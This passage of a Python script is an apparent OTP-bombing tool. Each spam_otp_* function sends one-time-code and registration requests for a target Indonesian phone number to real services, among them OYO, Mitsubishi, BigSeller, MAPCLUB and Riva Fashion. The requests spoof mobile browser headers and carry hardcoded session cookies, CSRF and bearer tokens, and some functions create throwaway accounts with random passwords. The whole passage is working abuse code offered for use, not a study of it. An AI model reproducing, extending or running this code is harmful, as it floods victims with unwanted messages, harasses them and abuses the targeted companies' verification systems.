  --data-raw 'phoneNumber={nomor}&countryCode=%2B62&isApp=false&mode=whatsapp'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_myvalue(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor
        else:
            nomor = '62' + nomor
        
        nomor = ''.join(filter(str.isdigit, nomor))
        
        import subprocess
        import json
        
        payload = json.dumps({
            "username": nomor,
            "template": "myvalue",
            "sendProvider": "whatsapp"
        })
        
        curl_cmd = f"""curl -s -X POST 'https://auth.myvalue.id/v2/verification/send' \\
  -H 'host: auth.myvalue.id' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json' \\
  -H 'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"' \\
  -H 'content-type: application/json' \\
  -H 'x-client-id: MyValueWeb' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://auth.myvalue.id' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'priority: u=1, i' \\
  -d '{payload}'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_joob(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor
        elif nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor = '0' + nomor[3:]
        else:
            nomor = '0' + nomor
        
        nomor = ''.join(filter(str.isdigit, nomor))
        
        if not nomor.startswith('0'):
            nomor = '0' + nomor
        
        import subprocess
        import json
        
        payload = json.dumps({
            "otpAuthType": "PHONE",
            "phoneNumber": nomor
        })
        
        curl_cmd = f"""curl -s -X POST 'https://api.joob.asia/v3/auth/otp/issue' \\
  -H 'host: api.joob.asia' \\
  -H 'x-platform: MOBILE_WEB' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-usertype: s' \\
  -H 'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'x-lang: id' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36' \\
  -H 'content-type: application/json' \\
  -H 'x-deviceid: b19391d2-4ca0-4eb3-92ae-2dc3da3f8d4a' \\
  -H 'accept: */*' \\
  -H 'origin: https://grab.joob.id' \\
  -H 'sec-fetch-site: cross-site' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://grab.joob.id/' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'priority: u=1, i' \\
  -d '{payload}'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                if data.get('data') and data['data'].get('otpSent'):
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_volta(nomor):
    try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        session = requests.Session()
        headers = {'accept': 'application/json, text/plain, */*', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/json', 'origin': 'https://voltaindonesia.com', 'referer': 'https://voltaindonesia.com/', 'sec-ch-ua': '\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '\"Android\"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}
        resp = session.post('https://auth-production.voltaindonesia.com/v1/client/request-otp', json={'phoneNumber': nomor}, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False

def spam_otp_viuum(nomor):
    try:
        if nomor.startswith('0'):
            nomor_lokal = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor_lokal = nomor[1:]
        elif not nomor.startswith('62'):
            nomor_lokal = '62' + nomor
        else:
            nomor_lokal = nomor

        session = requests.Session()
        url = 'https://api.viuum.co.id/api_viuum/v1/customer/one-time-phone'
        
        headers = {
            'accept': '*/*',
            'content-type': 'application/json',
            'origin': 'https://wearviuum.com',
            'referer': 'https://wearviuum.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
        }
        
        payload = {'number': nomor_lokal}
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
        
    except Exception as e:
        return False

def spam_otp_oyorooms(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        
        nomor = ''.join(filter(str.isdigit, nomor))
        
        if len(nomor) < 10:
            return False
        
        session = requests.Session()
        
        cookies = {
            'delta_ver': '1783169391.895.680.781361|30a98be7397e93d8ee905a77f63b5c5a',
            '_csrf': 'z2qem89SAImhv-99mY7Qz43S',
            'acc': 'IN',
            'locale': 'id',
            'X-Location': 'undefined',
            'mab': 'bb752a6c73fad035dc2ea0697579750f',
            'expd': 'mww2%3A1%7Cioab%3A1%7Cmhdp%3A1%7Cbcrp%3A0%7Cpwbs%3A1%7Cslin%3A1%7Chsdm%3A2%7Ccomp%3A0%7Cnrmp%3A1%7Cnhyw%3A1%7Cgcer%3A1%7Crecs%3A1%7Cswhp%3A1%7Clvhm%3A1%7Cgmbr%3A0%7Cyolo%3A1%7Crcta%3A1%7Ccbot%3A1%7Cotpv%3A1%7Ctrtr%3A0%7Clbhw%3A1%7Cndbp%3A0%7Cmapu%3A1%7Cnclc%3A1%7Cdwsl%3A1%7Ceopt%3A1%7Cotpv%3A1%7Cwizi%3A1%7Cmorr%3A1%7Cyopb%3A0%7CTTP%3A1%7Caimw%3A1%7Chdpn%3A0%7Cweb2%3A0%7Cspw1%3A0%7Cstrf%3A1%7Cltvr%3A1%7Cwizz%3A1%7Clpcp%3A1%7Cclhp%3A1%7Cprwt%3A1%7Ccbhd%3A1%7Cins2%3A3%7Cmcal%3A1%7Cmhdc%3A1%7Cmcal%3A1%7Clopo%3A1%7Cptax%3A1%7Ciiat%3A0%7Cpbnb%3A0%7Cror2%3A1%7Cmbwe%3A0%7Cmboe%3A0%7Cctry%3A1%7Cmshd%3A1%7Csovb%3A2%7Cctrm%3A1%7Cofcr%3A1%7Ciupi%3A1%7Cnbi1%3A3%7Crwtg%3A1%7Cstow%3A1%7Cimtg%3A2%7Cptpa%3A1%7Cormp%3A1%7Cpbre%3A0%7Cllat%3A0%7Cesmi%3A0%7Chdam%3A0',
            'appData': '%7B%22userData%22%3A%7B%22isLoggedIn%22%3Afalse%7D%7D',
            'token': 'SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc%3D',
            '_uid': 'Not%20logged%20in',
            'XSRF-TOKEN': 'bYRZoRu5-6fyXF51wSMdrrS0EAYDpphLOsfw',
            'ql': 'true',
            '_gcl_au': '1.1.1098408214.1783169392',
            'isHomepageViewed': 'true',
            'fingerprint2': 'a19e43fe531de889917ff09bd9c00e3b',
            '_ga': 'GA1.2.301009132.1783169392',
            '_gid': 'GA1.2.1435061004.1783169397'
        }
        
        session.cookies.update(cookies)
        
        fingerprint = "a19e43fe531de889917ff09bd9c00e3b"
        device_id = fingerprint + "530311"
        sdata = "eyJrdWQiOlsyNDIwMCwxNDUwMCwxMjcwMCwxOTUwMCwxMzkwMCwxNDAwMCwxNDUwMCwxNzAwMCwxMzcwMCwxMzAwMCwxMTkwMF0sImFjYyI6W10sImd5ciI6W10sInR1ZCI6WzE2MDAsMzAyMDAsNDQ5MDAsNDE1NzAwLDMxMTUwMCwyOTY4MDAsMzQ1NDAwLDM5NTcwMCwyOTYyMDAsMjEzODAwLDk2NTAwLDk3NjAwLDExMjEwMCwxNzkyMDAsMTE0NjAwLDE0NjcwMCw5NjQwMCwzMjY0MDAsMzQ0NjAwLDMyODQwMCwzMjgwMDAsMzYwNzAwLDUxMTMwMCw2NDQ0MDAsMzEzNzAwLDI4NzAwLDYxNjAwLDk1MzAwXSwidGlkIjpbNTYzMTAwMCwxNzM2MDIwMCw2MTk4MTAwLDExMzQwMDAsMzA0MjAwLDIwMTkwMCwyMjA5MDAsMjIwNTAwLDE4NjcwMCwxNjkwMDAsNTY4ODAwLDcwMjMwMCw5Njk5MDAsMjg3MDAwLDUzNTAwMCw3MTg3MDAsNjAyODAwLDEyMjE2MDAsMTcxMTAwLDIwNjEwMCwyMjA0MDAsMTg4MzAwLDE3MTMwMCw2NTYwMDAsMzM1NzAwLDM4NjgwMCw4MDIyNzgwMCwxMTc5MzQwMF0sImtpZCI6WzEyNzM5MTEwMCwxOTM1MDAsMjMyMTAwLDIyMjUwMCwyNDU5MDAsMjY5MzAwLDE1MjMwMCwyMzQ2MDAsMTY2NjAwLDIwNDEwMCwxODYyMDBdLCJ0bXYiOltbeyJ4IjoyNDcsInkiOjM2OX0seyJ4IjoyNTUsInkiOjM0Mn0seyJ4IjozMjcsInkiOjE4OX0seyJ4IjozMzUsInkiOjE3Nn1dLFt7IngiOjI1NSwieSI6MzYyfSx7IngiOjI1OSwieSI6MzU0fSx7IngiOjM0NywieSI6MTc4fSx7IngiOjM1MSwieSI6MTcyfV0sW3sieCI6MjQwLCJ5Ijo1MTZ9LHsieCI6MjM4LCJ5Ijo1MjZ9LHsieCI6MjM3LCJ5Ijo1Mzh9LHsieCI6MjM3LCJ5Ijo1NDB9LHsieCI6MjM3LCJ5Ijo1Mzl9XSxbeyJ4IjoyNTUsInkiOjM1MX0seyJ4IjoyNTMsInkiOjM1OX0seyJ4IjoyMzUsInkiOjUwMH0seyJ4IjoyMzUsInkiOjUyNX0seyJ4IjoyMzUsInkiOjUzN31dLFt7IngiOjIwMCwieSI6MzIxfSx7IngiOjIwNSwieSI6MzA3fSx7IngiOjIyMywieSI6MjU2fSx7IngiOjIyMywieSI6MjU2fV1dfQ=="
        
        headers = {
            'accept': '*/*',
            'accept-language': 'id',
            'content-type': 'application/json',
            'origin': 'https://identity-gateway.oyorooms.com',
            'referer': 'https://identity-gateway.oyorooms.com/login',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36',
            'access_token': 'SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=',
            'deviceid': device_id,
            'fingerprint_hash': fingerprint,
            'loc': '153',
            'sData': sdata,
            'externalHeaders': '[object Object]',
            'XSRF-TOKEN': 'bYRZoRu5-6fyXF51wSMdrrS0EAYDpphLOsfw'
        }
        
        payload = {
            "phone": nomor,
            "country_code": "+62",
            "nod": 4
        }
        
        r = session.post('https://identity-gateway.oyorooms.com/api/pwa/generateotp?locale=id',
            json=payload,
            headers=headers,
            timeout=10
        )
        
        if r.status_code == 200:
            try:
                data = r.json()
                status = data.get('status', '')
                is_user_present = data.get('is_user_present', False)
                
                if status == "correct" and is_user_present:
                    return True
                elif status == "correct" and not is_user_present:
                    return False
                else:
                    return False
            except:
                return True if r.status_code == 200 else False
        else:
            return False
        
    except Exception as e:
        return False

def spam_otp_jembatani(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = nomor
        elif nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        else:
            nomor_lokal = "0" + nomor
        
        import random
        import string
        rand_name = 'User' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
        rand_pass = "Test@" + ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + "#1"
        
        session = requests.Session()
        url = "https://api.jembatani.co.id/v1/register"
        
        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://jembatani.co.id',
            'Referer': 'https://jembatani.co.id/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }
        
        payload = {
            "phone": nomor_lokal,
            "name": rand_name,
            "password": rand_pass
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False

def spam_otp_bigseller(nomor):
    try:
        if nomor.startswith("0"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor[2:]
        else:
            nomor_lokal = nomor
        session = requests.Session()
        url = "https://www.bigseller.com/api_v2/api/v3/auth/sendRegPhoneCode.json"
        payload = {
            "phoneAccountNum": nomor_lokal,
            "phoneAccountCode": 62,
            "accessCode": "",
            "picVerificationCode": "",
            "ticketId": "tr03NJtP5mTD41cvhMEPRCghT45ergDNSopNa2N-ZQCdKSKRD-L=0oMy3nCnpFeXiigBvrd0Kcyb5wOmMg=rRJoSie1f3PDzS=HJtvgbYT=S71tux2JkJa4hCjoQH7eyGZvrIMxch=nQ4qY*",
            "randomStr": "@T2d"
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
            'sec-ch-ua-mobile': "?1",
            'origin': "https://www.bigseller.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'accept-language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            'priority': "u=1, i",
        }
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False

def spam_otp_mapclub_sms(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]
        else:
            nomor = nomor
        
        token = "eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiIwMWQ3MmY3Yi1mMTY2LTRmM2YtOWZhYi1hMGViNGQ2MjE5YTIiLCJleHBpcmVkIjoxNzgzNTM3MTA4MDMzLCJleHBpcmUiOjM2MDAsImV4cCI6MTc4MzUzNzEwOCwiaWF0IjoxNzgzNTMzNTA4LCJwbGF0Zm9ybSI6IldFQiJ9.AEe4pFBbLiTtQkCBoc4NgFiyzxJmqVs-YjNp0HkW6Xbi14oOo_lRZGOojeF9nngJm6CwmvvGPtTZ34jZxyqzCg"
        
        url = 'https://beryllium.mapclub.com/api/member/registration/sms/otp?channel=SMS'
        
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'in-ID',
            'authorization': f'Bearer {token}',
            'client-platform': 'WEB',
            'client-timestamp': str(int(time.time() * 1000)),
            'content-type': 'application/json',
            'origin': 'https://www.mapclub.com',
            'referer': 'https://www.mapclub.com/',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36'
        }
        
        payload = {
            "account": nomor,
            "prefix": "62"
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
        
    except Exception as e:
        return False

def spam_otp_mitsubishi(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        if not phone.startswith('0'):
            phone = '0' + phone
        
        import subprocess
        import json
        
        token = "gl2fM1uAde6lawKEL7n6WrdJyhdv76lMz5g52jjc"
        
        curl_cmd = f"""curl -s -X POST 'https://mymitsubishiapps.com/v2/register' \\
  -H 'host: mymitsubishiapps.com' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-csrf-token: {token}' \\
  -H 'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'x-requested-with: XMLHttpRequest' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/javascript, */*; q=0.01' \\
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\
  -H 'origin: https://mymitsubishiapps.com' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://mymitsubishiapps.com/otp/verification' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: _ga=GA1.1.1373975984.1785253338; _clck=1gy2n3h%5E2%5Eg84%5E0%5E2400; moe_uuid=13378e8d-ab96-49a0-b204-4d2f18d08bd5; XSRF-TOKEN=eyJpdiI6IlFEZzZQR2RpdmVOTVpNdjhUTGFwS3c9PSIsInZhbHVlIjoiRnJTUWh0cWY0NHFpYmJvaHg0SFJzMzNcL2J3XC9IN3hkWVlKMG1LQ3dYejBTRGdzQlFXKzdyVVI2MTZIb2NVb05iIiwibWFjIjoiM2NmOTQ1NTk2NTkwY2FlN2E0NzU4YmJmNjdmYWQyMDNlZGI2N2QzNzgzNmU5MzI2ZmVhNGVhZDA2YTVkOGY1OCJ9; laravel_session=eyJpdiI6ImJcL29qM1RiVUowaVpUSTc5Vm1La0t3PT0iLCJ2YWx1ZSI6Inp3d1F0R0N0YTRRYitEWlQ5WTVZd3JXMUtEcDhwVGJXM3V4bmtIVmczK21QdXBCRWZvdVJCQzJGTWtPekl1V2d5dlhHbU10b0ZsTlRPV2hUMWxaZUVPSzd0azZHamhqa25ubGMwVVdhYm1cL2VlT3ZZaVNtV0w3UTd6TkNSOTFpZCIsIm1hYyI6ImUyNGUxMzRhNzQ0ZTk2NDA0ZWJiMzBiYjE2ZjM1MjRiMTY5M2Y5ZDhhZDA5MWNlNmIxNjU3MDk0ZDA0NTg0M2IifQ%3D%3D; _ga_NE22QPMPLD=GS2.1.s1785253338$o1$g1$t1785253373$j25$l0$h0; _clsk=6rcx1s%5E1785253374187%5E4%5E1%5Ee.clarity.ms%2Fcollect' \\
  -H 'priority: u=1, i' \\
  --data-raw '_token={token}&type=whatsapp&value={phone}&accept_privacy_policy=1&newsletter=1'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_rivafashion(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor
        elif nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor = '0' + nomor[3:]
        else:
            nomor = '0' + nomor
        
        nomor = ''.join(filter(str.isdigit, nomor))
        
        if not nomor.startswith('0'):
            nomor = '0' + nomor
        
        import subprocess
        import json
        import re
        curl_get_cmd = """curl -s -L 'https://www.rivafashion.com/en/customer/account/create/' \\
  -H 'User-Agent: Mozilla/5.0 (Linux; Android 11; RMX2001 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/150.0.7871.124 Mobile Safari/537.36' \\
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'"""
        
        result_get = subprocess.run(['bash', '-c', curl_get_cmd], capture_output=True, text=True)
        
        form_key = "p10fnMB1CA8Y1Eui"
        if result_get.returncode == 0 and result_get.stdout:
            match = re.search(r'<input[^>]*name="form_key"[^>]*value="([^"]+)"', result_get.stdout)
            if match:
                form_key = match.group(1)
        
        payload = json.dumps({
            "mobile_number": nomor[1:],
            "phone_code": "+62",
            "form_key": form_key
        })
        
        curl_post_cmd = f"""curl -s -X POST 'https://www.rivafashion.com/en/web/register/send' \\
  -H 'Accept: application/json, text/javascript, */*; q=0.01' \\
  -H 'Accept-Encoding: gzip, deflate, br' \\
  -H 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \\
  -H 'Origin: https://www.rivafashion.com' \\
  -H 'Referer: https://www.rivafashion.com/en/customer/account/create/' \\
  -H 'User-Agent: Mozilla/5.0 (Linux; Android 11; RMX2001 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/150.0.7871.124 Mobile Safari/537.36' \\
  -H 'X-Requested-With: XMLHttpRequest' \\
  -d 'mobile_number={nomor[1:]}&phone_code=%2B62&form_key={form_key}'"""
        
        result_post = subprocess.run(['bash', '-c', curl_post_cmd], capture_output=True, text=True)
        
        if result_post.returncode == 0 and result_post.stdout:
            try:
                data = json.loads(result_post.stdout)
                if data.get('success') is True or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                if data.get('data') and data['data'].get('otpSent'):
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_datascripmall(nomor):
    try:
        if nomor.startswith('0'):
            phone = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            phone = '+62' + nomor
        elif nomor.startswith('+62'):
            phone = nomor
        else:
            phone = '+62' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        if not phone.startswith('62'):
            phone = '62' + phone
        
        phone = '+' + phone
        
        import subprocess
        import json
        
        curl_cmd = f"""curl -s -X POST 'https://datascripmall.id/api/app/buyer/register/request-otp' \\
  -H 'host: datascripmall.id' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'content-type: application/json' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://datascripmall.id' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://datascripmall.id/register/perorangan' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: _ga=GA1.1.657807458.1785422889; moe_uuid=5cefeacf-f41d-4d22-8644-578bb5a6751e; _fbp=fb.1.1785422886169.83826567122468884.AQYAAQIB; _gcl_aw=GCL.1785423521.CjwKCAjw7KvTBhA6EiwAWnutYZTFUrVgZnPcuE2Vm8b1x-lclJCkOgLxSOZXqD9XVffjvY0oVuRyGRoCdqYQAvD_BwE; _gcl_gs=2.1.k1$i1785423512$u152165420; __Host-next-auth.csrf-token=293c40a1d89e1ebf1f65529dae844021c68bf527b9010349cba333fad1321d6c%7C89d0644d6e9f85d2222e64176b6f94408161531bceedf2cc64dde51ddd332cc4; __Secure-next-auth.callback-url=https%3A%2F%2Fdatascripmall.id; last_visited_page=%2F; _gcl_au=1.1.782293264.1785422888.-.-.1785422889.136969314.1787146397.1787146396; _ga_ZRQCEHEE7M=GS2.1.s1787146396$o2$g1$t1787146435$j21$l0$h0' \\
  -H 'priority: u=1, i' \\
  -d '{{"email":"Tono34Jo80byats@gmail.com","phone_number":"{phone}","channel":"wa"}}'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_buccheri(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor[1:]
        elif nomor.startswith('62'):
            phone = nomor[2:]
        elif nomor.startswith('+62'):
            phone = nomor[3:]
        else:
            phone = nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        import subprocess
        import json
        
        curl_cmd = f"""curl -s -X POST 'https://member.buccheri.com/otp-sent' \\
  -H 'host: member.buccheri.com' \\
  -H 'cache-control: max-age=0' \\
  -H 'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'upgrade-insecure-requests: 1' \\
  -H 'content-type: application/x-www-form-urlencoded' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36' \\
  -H 'origin: https://member.buccheri.com' \\
  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: navigate' \\
  -H 'sec-fetch-user: ?1' \\
  -H 'sec-fetch-dest: document' \\
  -H 'referer: https://member.buccheri.com/otp' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: _ga=GA1.1.517445661.1786009922; _clck=umhr0c%5E2%5Eg8d%5E0%5E2409; _clsk=furbu5%5E1786009926484%5E1%5E1%5Ez.clarity.ms%2Fcollect; _ga_4FSQVMN5FX=GS2.1.s1786009922$o1$g1$t1786009978$j4$l0$h0; ci_session=091bc4bfe7b2c6ab4427214bfbe54337138963cd' \\
  -H 'priority: u=0, i' \\
  --data-raw 'phonenumber={phone}&otptype=SIGNUP'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_jec(nomor):
    try:
        if nomor.startswith('0'):
            phone = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            phone = nomor[1:]
        elif nomor.startswith('62'):
            phone = nomor
        else:
            phone = '62' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        import subprocess
        import json
        
        token = "qfKK4y73SkCXC5MhZlI70Ivw5Xqe1i0cjrbBxK1p"
        rdr = "eyJpdiI6InczVHdsQ2NwZzJjQ1JWVGhDQ1FZK0E9PSIsInZhbHVlIjoiTnU5RXF0WWNWUCs5Slc4MnM1eXBxT2kxQmhlTW1sVHl4UmJKMGg3RVIzST0iLCJtYWMiOiI2NjBkZTk1MjQyMTE3NTI4MGVlMTBkMzIwNzVkZGY5MjBjMTI1ZGVlMGRkMGUyMWZkZWVhZmEyZTU4Yzk0NDIyIiwidGFnIjoiIn0%3D"
        
        curl_cmd = f"""curl -s -X POST 'https://jec.co.id/id/login-via-otp' \\
  -H 'host: jec.co.id' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-requested-with: XMLHttpRequest' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/javascript, */*; q=0.01' \\
  -H 'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"' \\
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://jec.co.id' \\
  -H 'sec-fetch-site: same-origin' \\
